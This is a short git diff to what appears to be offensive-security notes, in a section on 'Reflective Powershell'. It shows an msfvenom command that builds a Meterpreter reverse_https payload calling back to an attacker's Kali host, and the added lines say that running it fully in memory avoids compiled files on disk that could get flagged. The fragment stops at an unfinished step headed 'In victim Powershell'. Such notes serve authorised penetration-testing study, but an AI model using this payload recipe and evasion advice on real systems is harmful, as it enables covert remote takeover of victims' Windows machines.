@@ -184,6 +184,9 @@ public class TestClass
 </details>
 
 ## Reflective Powershell
+
+Using .NET in powershell still saves temp .cs compiled code to disk that could get flagged. This method is completely in memory
+
 1. `msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<kali ip> LPORT=<port> EXITFUNC=thread -f ps1`
 2. In victim Powershell:
 ```
